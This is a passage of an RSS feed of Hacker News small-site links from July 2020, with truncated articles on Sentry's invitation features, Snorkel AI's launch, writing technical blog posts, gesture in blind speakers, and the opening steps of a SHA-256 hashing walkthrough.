<li><strong>9%</strong> more users accepted invitations in the <em>Request to Join</em> treatment vs. the baseline</li>
<li><strong>21%</strong> more users accepted invitations who had both <em>Request to Invite</em> and <em>Request to Invite</em> treatments enabled</li>
</ul>
<p>It‚Äôs probably not a surprise that allowing a wider set of users to invite team members resulted in more users inviting team members. It‚Äôs also probably not a surprise that enabling both feature sets at the same time was even better (given that they complement each other)!</p>
<h2 id="turning-users-into-active-users"><a href="#turning-users-into-active-users" aria-label="turning users into active users permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Turning users into active users</h2>
<p>Having more users join your platform is great, but what‚Äôs the point if those users never actually <em>use</em> the product? To be truly confident ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</a></em></p>]]>
            </description>
            <link>https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</link>
            <guid isPermaLink="false">hacker-news-small-sites-23841049</guid>
            <pubDate>Wed, 15 Jul 2020 03:42:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snorkel AI: Putting Data First in ML Development]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 30 (<a href="https://news.ycombinator.com/item?id=23841011">thread link</a>) | @polm23
<br/>
July 14, 2020 | https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html | <a href="https://web.archive.org/web/*/https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <p>
                      Today I‚Äôm excited to announce Snorkel AI‚Äôs launch out of stealth!
                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world‚Äôs leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you‚Äôve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we‚Äôve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.
                  </p>
                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png"></p><p>
                      <b>Today‚Äôs ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we‚Äôve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models‚Äîoften deep learning architectures‚Äîare not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there‚Äôs no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if ‚Äúemployment‚Äù is in the title, the contract should be labeled as an ‚ÄúEmployment contract.‚Äù
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it‚Äôs like playing 20 questions rather than just communicating the answer directly‚Äîfine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive‚Äìespecially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet‚Äîone of the foundational projects behind ML‚Äôs current explosive progress‚Äîtook <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity‚Äîor more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can‚Äôt be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks‚Äîeverything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.
                  </p>
                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as ‚ÄúEmployment contracts‚Äù if the word ‚Äúemployment‚Äù is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks‚Äîas an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html">https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html</a></em></p>]]>
            </description>
            <link>https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23841011</guid>
            <pubDate>Wed, 15 Jul 2020 03:36:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to write technical posts so people will read them (2019)]]>
            </title>
            <description>
<![CDATA[
Score 226 | Comments 50 (<a href="https://news.ycombinator.com/item?id=23840787">thread link</a>) | @benhoyt
<br/>
July 14, 2020 | https://reasonablypolymorphic.com/blog/writing-technical-posts/ | <a href="https://web.archive.org/web/*/https://reasonablypolymorphic.com/blog/writing-technical-posts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of today‚Äôs best bloggers in the functional programming space is <a href="https://chrispenner.ca/">Chris Penner</a>. Despite this, Chris is criminally underrated‚Äînobody I talk to seems to know of his work. Go check him out as soon as you finish reading this post!</p>
<p>This is reasonably pervasive phenomenon in our subculture; there‚Äôs lots of fantastic work being produced, but for one reason or another, it falls between the cracks. I‚Äôd propose the biggest obstacle is that most FP writing <em>isn‚Äôt optimized to be read.</em></p>
<p>So I‚Äôd like to take some time today and talk about common failure modes in technical writing. If you don‚Äôt have a checklist you run through before publishing a post, you‚Äôll probably get a lot of benefit from internalizing this advice.</p>
<p>The value? You‚Äôll make it easier for people to understand what you‚Äôre trying to tell them. Which is why you‚Äôre writing in the first place, right? The good news is that none of this is magic‚Äîjust some simple guidelines for structuring your content.</p>
<h2 id="the-guiding-principle">The Guiding Principle</h2>
<p>Here‚Äôs the biggest thing to keep in mind: your reader doesn‚Äôt really care what you have to say. You get maybe four sentences to convince them that your essay is worth their time. If you haven‚Äôt made your case by then, you‚Äôve probably lost them to the next tab they binge-opened.</p>
<p>Even after you‚Äôve convinced them that it‚Äôs a valuable read, you need to continue assuring them that you‚Äôre not wasting their time. If you take too long to get to the point, or if you make the information too hard to find on a quick skim, you‚Äôve lost them again.</p>
<p>As a result, alongside your technical content, you have two primary goals to focus on:</p>
<ul>
<li>Provide strong, concise motivations for everything you want to talk about.</li>
<li>Make it easy to skim.</li>
</ul>
<p>If you can do these two things, you‚Äôre already most of the way to better engagement.</p>
<h2 id="writing-strong-motivations">Writing Strong Motivations</h2>
<p>People care about solutions to problems they have, or expect to have one day. They care about other things too, but it‚Äôs not really relevant to us today.</p>
<p>With this in mind, you want to tailor your motivations in terms of <em>solutions to problems.</em></p>
<p>Here are some good examples of problems that you‚Äôve probably run into (and links to their solutions for you to read later):</p>
<ul>
<li><a href="https://chrispenner.ca/posts/adjunction-battleship">Ed Kmett writes shitty documentation</a></li>
<li><a href="https://reasonablypolymorphic.com/blog/higher-kinded-data/">I have lots of types that need to evolve at the same time</a></li>
<li><a href="http://thinkingwithtypes.com/">There is no good place to learn type-level programming</a></li>
</ul>
<p>Bad examples of motivating documents are things that assume you care <em>simply because they exist.</em> This is <a href="http://hackage.haskell.org/package/pipes-4.3.9/docs/Pipes-Tutorial.html">pretty</a> <a href="http://yannesposito.com/Scratch/en/blog/Yesod-tutorial-for-newbies/">common</a> of libraries‚Äô tutorials. The same document that convinces you to use a technology should also show you how.</p>
<p>As a more general rule, focusing on <em>why</em> is going to be more valuable than on <em>how.</em></p>
<p>Why should someone care, and why your solution is a good one.</p>
<p>‚ÄúHow‚Äù without a ‚Äúwhy‚Äù suggests a contrived solution to a made-up problem. In other words, it‚Äôs easily read as ‚Äúwho cares?‚Äù</p>
<h2 id="understanding-how-people-read">Understanding How People Read</h2>
<p>People who spend lots of time reading have good heuristics for skipping lots of text. If you understand these heuristics, you can make it easy for people to find what they‚Äôre looking for. And remember: they‚Äôre looking for reasons to continue reading.</p>
<p>There are two behaviors here. The first is what I call ‚Äúskimming for concepts‚Äù‚Äîwhich is that people will attempt to determine what text is about at a high-level. They‚Äôre looking for <em>what you‚Äôre trying to tell them</em>, as opposed to <em>what you‚Äôre actually saying.</em></p>
<p>When skimming, people are likely to read only the headings and the first two sentences of a paragraph. If they‚Äôre convinced they know what you have to say, they‚Äôll skip to the next paragraph. If several paragraphs in a row don‚Äôt seem relevant, they‚Äôll skip to the next heading.</p>
<p>If the next heading also fails to grab their attention, they‚Äôll probably give up.</p>
<p>The solution is to structure your argument as a tree. Headings must provide enough information to let someone know whether or not they care about the following prose.</p>
<p>This also means that the first sentence of each paragraph should be sufficient to understand the rest of the paragraph. The remaining sentences are only allowed to reinforce or give details of the first sentence. One paragraph equals one idea.</p>
<p>Roughly speaking, the hierarchy of your document should look like this:</p>
<ul>
<li>Document
<ul>
<li>Heading
<ul>
<li>First sentence
<ul>
<li>Rest of paragraph</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p>Maybe you feel like it‚Äôs hard to know how much knowledge to assume your readership knows. Understanding how people read makes this a non-issue. Present as much information as is necessary to understand your point, but make it easy to skip if people already know it. Those who don‚Äôt yet know will learn, those who do can skip past, and both camps will appreciate it.</p>
<p>After you‚Äôve convinced your reader that they care what you have to say, they‚Äôre more willing to read what you <em>actually have to say.</em> When the reader is ready to dive in, that‚Äôs when you can make the finer points of your argument.</p>
<p>It‚Äôs unlikely that anyone is going to read every word of your essay. It‚Äôs even less likely that they‚Äôll read them all in order.</p>
<h2 id="stumbling-blocks">Stumbling Blocks</h2>
<p>Now that you‚Äôve got people ready to listen to you, it‚Äôs important to keep them on the same page as you. You really need to stay on top of anything that might break their focus.</p>
<p>Use short sentences. If it‚Äôs too hard to parse, people won‚Äôt.</p>
<p>Make sure your spelling and grammar have no egregious problems. You don‚Äôt need to have perfect command of the language, but you need to be able to signal that you‚Äôre trustworthy-enough to listen to. Don‚Äôt underestimate how much credibility you‚Äôll lose from blatantly bad spelling and grammar.</p>
<p>This stuff is relatively common-sense.</p>
<p>What might be less so is that you also need to stay on top of conceptual stumbling blocks. If your argument makes a jump that feels poorly motivated or references something potentially unfamiliar, expect that your reader will experience vertigo.</p>
<p>Most of the ideas we talk about in functional programming <em>are not easy,</em> and it doesn‚Äôt do anyone any favors to pretend this isn‚Äôt so. Expect that your readers will be pretty similar to you; if you had a problem understanding a piece of your topic, <em>call that out.</em> Point out the obstacle. Point out what they might be thinking, and then very explicitly show them what they should be thinking instead.</p>
<p>For example, if your code sample uses a <a href="https://en.wikipedia.org/wiki/Functional_dependency">functional dependency</a>, it might be worth a short sentence saying ‚Äúthat funny bar thing is a functional dependency.‚Äù Give a tiny summary of its purpose, and provide a link for them to learn more if they need to.</p>
<p>Another illustration: if <em>you</em> originally got confused that an ‚Äúalgebra in recursion schemes‚Äù is not the same thing as the algebra you learned in high-school, your readers probably will too. The first time you say ‚Äúalgebra‚Äù in the new context, say ‚Äúthis is a misleading term. This has nothing to do with solving equations like you did in high-school.‚Äù</p>
<p>More important than what you‚Äôre saying is what you‚Äôre <em>not saying.</em> If you‚Äôre giving examples of something that fits a pattern, make sure you give examples of things that <em>do not</em> fit the pattern. A concept that is applicable everywhere is useful nowhere.</p>
<p>Give lots of examples. Nobody I know learns via mathematical statements, nor do they learn via long, wordy, abstract prose. People learn by seeing lots of examples, and being told explicitly how these examples relate to one another. The mathematical statements are only useful <em>after</em> you have the intuition, so save them for an appropriate time.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The takeaway advice from this essay is that <em>if you want lots of readers, you must make it easy for them to read.</em></p>
<p>To that end, pay lots of attention to motivation. Why should people care what you have to say? What value does it give <em>them?</em></p>
<p>Focus your energy on the beginnings‚Äîboth of the essay as a whole, and of each paragraph. People who are unconvinced by your essay‚Äôs value will skim their way through it, and they will do that by reading only the beginnings of things.</p>
<p>Make your information easy to find. Structure your argument in a tree, and make sure it supports random-access. Nobody is going to read the whole thing from start to finish. Instead they‚Äôre going to jump around, ignoring the pieces they already know, and looking for the bits they don‚Äôt.</p>
<p>Use lots of short paragraphs. A paragraph should correspond to a single idea.</p>
<p>Anticipate which parts of your argument will be difficult for your readers, and be proactive in trying to assuage those difficulties. Give lots of examples of what you‚Äôre talking about, and more importantly, what you‚Äôre not talking about.</p>
<p>Point out where you went into the weeds while learning this stuff. Steer readers away from common mistakes and misconceptions.</p>
<p>And finally, end on a high note. Leave people with a good feeling, and it will incentivize them to get to the bottom of your next piece. Inspirational calls to action are a good way to go out.</p>
<blockquote>
<p>Tell them what you‚Äôre going to tell them. Then tell them. Finally, tell them what you told them.</p>
<p>-Unknown</p>
</blockquote>
<p>Funny and poignant quotes are too.</p>

<p>
    <span>
        <a href="https://reasonablypolymorphic.com/blog/thinking-with-types">‚Üê</a>
    </span>
    <span>
        <a href="https://reasonablypolymorphic.com/blog/freer-monads">‚Üí</a>
    </span>
</p>

</div></div>]]>
            </description>
            <link>https://reasonablypolymorphic.com/blog/writing-technical-posts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23840787</guid>
            <pubDate>Wed, 15 Jul 2020 03:10:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blind speakers gesture like their sighted counterparts: study (2016)]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 27 (<a href="https://news.ycombinator.com/item?id=23839973">thread link</a>) | @rhyzomatic
<br/>
July 14, 2020 | https://www.superlinguo.com/post/149950073272/blind-people-gesture-and-why-thats-kind-of-a-big | <a href="https://web.archive.org/web/*/https://www.superlinguo.com/post/149950073272/blind-people-gesture-and-why-thats-kind-of-a-big">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-149950073272"><header><p><a href="https://www.superlinguo.com/post/149950073272/blind-people-gesture-and-why-thats-kind-of-a-big#notes"><span></span><em>51,563 notes</em></a></p><time datetime="2016-09-05" pubdate=""><a rel="bookmark" href="https://www.superlinguo.com/post/149950073272/blind-people-gesture-and-why-thats-kind-of-a-big">September 5, 2016</a></time></header><section><p>People who are blind from birth will gesture when they speak. I always like pointing out this fact when I teach classes on gesture, because it gives us an an interesting perspective on how we learn and use gestures. Until now I‚Äôve mostly cited <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.nature.com%2Fnature%2Fjournal%2Fv396%2Fn6708%2Fabs%2F396228a0.html&amp;t=ZjI3ODlkYTk0MjZhMTQ3OTdkZTY3OWE3MjA1YzU0NTI2N2JmYTk3MixqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">a 1998 paper from Jana Iverson and Susan Goldin-Meadow</a> that analysed the gestures and speech of young blind people. Not only do blind people gesture, but the frequency and types of gestures they use does not appear to differ greatly from how sighted people gesture. If people learn gesture without ever <i>seeing</i> a gesture (and, most likely, never being shown), then there must be something about learning a language that means you get gestures as a bonus.</p><p>Blind people will even gesture when talking to other blind people, and sighted people will gesture when speaking on the phone - so we know that people don‚Äôt <i>only </i>gesture when they speak to someone who can see their gestures. <br></p><p>Earlier this year a new paper came out that adds to this story. ≈ûeyda OÃàzcÃßalƒ±≈ükan, CheÃÅ Lucero and Susan Goldin-Meadow looked at the gestures of blind speakers of Turkish and English, to see if the *way* they gestured was different to sighted speakers of those languages. Some of the sighted speakers were blindfolded and others left able to see their conversation partner. <br></p><p>Turkish and English were chosen, because it has already been established that speakers of those languages <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fscholar.google.co.uk%2Fscholar%3Fhl%3Den%26q%3DExpressing%2Bmanner%2Band%2Bpath%2Bin%2BEnglish%2Band%2BTurkish%253A%2BDifferences%2Bin%2Bspeech%252C%2Bgesture%252C%2Band%2Bconceptualization.%26btnG%3D%26as_sdt%3D1%252C5%26as_sdtp%3D&amp;t=N2I4ZTYyZmU0ZTFlOWY3NjMwYzliYjNiNjQ3MTQyZWJmNGJjZThhMCxqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">consistently gesture differently</a> when talking about videos of items moving. English speakers will be more likely to show the manner (e.g. ‚Äòrolling‚Äô or bouncing‚Äô) and trajectory (e.g. ‚Äòleft to right‚Äô, ‚Äòdownwards‚Äô) together in one gesture, and Turkish speakers will show these features as two separate gestures. This reflects the fact that English ‚Äòroll down‚Äô is one verbal clause, while in Turkish the equivalent would be<i> yuvarlanarak iniyor</i>, which translates as two verbs ‚Äòrolling descending‚Äô. <br></p><p>Since we know that blind people <i>do</i> gesture, OÃàzcÃßalƒ±≈ükan‚Äôs team wanted to figure out if they gestured like other speakers of their language. Did the blind Turkish speakers separate the manner and trajectory of their gestures like their verbs? Did English speakers combine them? Of course, the standard methodology of showing videos wouldn‚Äôt work with blind participants, so the researchers built three dimensional models of events for people to feel before they discussed them.<br></p><p>The results showed that blind Turkish speakers gesture like their sighted counterparts, and the same for English speakers. All Turkish speakers gestured significantly differently from all English speakers, regardless of sightedness. This means that these particular gestural patterns are something that‚Äôs deeply linked to the grammatical properties of a language, and not something that we learn from looking at other speakers. <br></p><p><b>References</b><br></p><p>Jana M. Iverson &amp; Susan Goldin-Meadow. 1998. Why people gesture when they speak. <i>Nature</i>, <i>396</i>(6708), 228-228.</p><p>≈ûeyda OÃàzcÃßalƒ±≈ükan, CheÃÅ Lucero and Susan Goldin-Meadow. 2016. Is Seeing Gesture Necessary to Gesture
Like a Native Speaker?
<i>Psychological Science</i>
	
	
		
			
				
					27(5) 737‚Äì747<i>.</i></p><p>Asli Ozyurek &amp; Sotaro Kita. 1999. Expressing manner and path in English and Turkish: 
Differences in speech, gesture, and conceptualization. In <i>Twenty-first Annual Conference of the Cognitive Science Society </i>(pp. 507-512). Erlbaum.<br></p></section></article></div>]]>
            </description>
            <link>https://www.superlinguo.com/post/149950073272/blind-people-gesture-and-why-thats-kind-of-a-big</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839973</guid>
            <pubDate>Wed, 15 Jul 2020 00:49:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How SHA-2 works step-by-step (SHA-256)]]>
            </title>
            <description>
<![CDATA[
Score 183 | Comments 19 (<a href="https://news.ycombinator.com/item?id=23839895">thread link</a>) | @lanecwagner
<br/>
July 14, 2020 | https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>SHA-2 (Secure Hash Algorithm 2), of which SHA-256 is a part, is one of the most popular <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hashing algorithms</a> out there. In this article, we are going to break down each step of the algorithm as simple as we can and work through a real-life example by hand.</p>



<p>SHA-2 is known for its security (it hasn‚Äôt <a aria-label="undefined (opens in a new tab)" href="https://shattered.io/" target="_blank" rel="noreferrer noopener">broken down like SHA-1</a>), and its speed. In cases where <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">keys are not being generated</a>, such as mining Bitcoin, a fast hash algorithm like SHA-2 often reigns supreme.</p>



<h2><span id="What_Is_a_Hash_Function">What Is a Hash Function?</span>
</h2>



<p>If you want to read more about hash functions in general, do so <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">here</a>. That said, in order to move forward let‚Äôs recap three of the main purposes of a hash function:</p>



<ul>
<li>To scramble data deterministically</li>
<li>To accept input of any length and output a fixed-length result</li>
<li>To irreversibly manipulate data. The input can‚Äôt be derived from the output</li>
</ul>
<h2><span id="SHA-2_vs_SHA-256">SHA-2 vs SHA-256</span>
</h2>



<p>SHA-2 is an <em>algorithm</em>, a generalized idea of how to hash data. SHA-256 sets additional constants that define the SHA-2 algorithm‚Äôs behavior. One such constant is the output size. ‚Äú256‚Äù and ‚Äú512‚Äù refer to their respective output digest sizes in bits.</p>



<p>Let‚Äôs step through an example of SHA-256.</p>



<h2><span id="SHA-256_hello_world_Step_1_-_Pre-Processing">SHA-256 ‚Äúhello world‚Äù; Step 1 ‚Äì Pre-Processing</span>
</h2>



<ul><li>Convert ‚Äúhello world‚Äù to binary:</li></ul>
<pre><code>01101000 01100101 01101100 01101100 01101111 00100000 01110111 01101111
01110010 01101100 01100100</code></pre>



<ul><li>Append a single 1:</li></ul>
<pre><code>01101000 01100101 01101100 01101100 01101111 00100000 01110111 01101111
01110010 01101100 01100100 1</code></pre>



<ul><li>Pad with 0‚Äôs until data is a multiple of 512, less 64 bits (448 bits in our case):</li></ul>
<pre><code>01101000 01100101 01101100 01101100 01101111 00100000 01110111 01101111
01110010 01101100 01100100 10000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
</code></pre>



<ul><li>Append 64 bits to the end, where the 64 bits are a <a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer representing the length of the original input in binary. In our case, 88, or in binary, ‚Äú1011000‚Äù.</li></ul>
<pre><code>01101000 01100101 01101100 01101100 01101111 00100000 01110111 01101111
01110010 01101100 01100100 10000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 00000000 00000000 00000000 00000000 00000000 01011000</code></pre>



<p>Now we have our input, which will always be evenly divisible by 512.</p>



<h2><span id="Step_2_-_Initialize_Hash_Values_h">Step 2 ‚Äì Initialize Hash Values (h)</span>
</h2>



